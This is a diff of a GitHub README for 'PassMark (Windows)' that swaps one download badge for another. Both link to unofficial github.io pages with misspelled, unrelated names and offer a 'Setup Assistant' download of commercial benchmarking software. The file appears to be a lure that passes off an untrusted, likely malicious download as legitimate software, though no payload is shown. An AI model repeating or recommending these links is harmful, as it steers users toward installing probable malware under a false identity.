@@ -5,13 +5,7 @@
 
 <h1 align="center">⚙️ PassMark (Windows)</h1>
 
-<p align="center">
-  <a href="https://passmark-diskchekup-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20PassMark-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download PassMark for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://singeltonvallier.github.io/.github/passmark-diskchekup)
 
 <p align="center">
   <img src="https://habrastorage.org/getpro/habr/upload_files/c74/e89/852/c74e89852a1320ccc7b6602fecf5f05a.png" alt="PassMark PerformanceTest Interface Preview" width="600" />
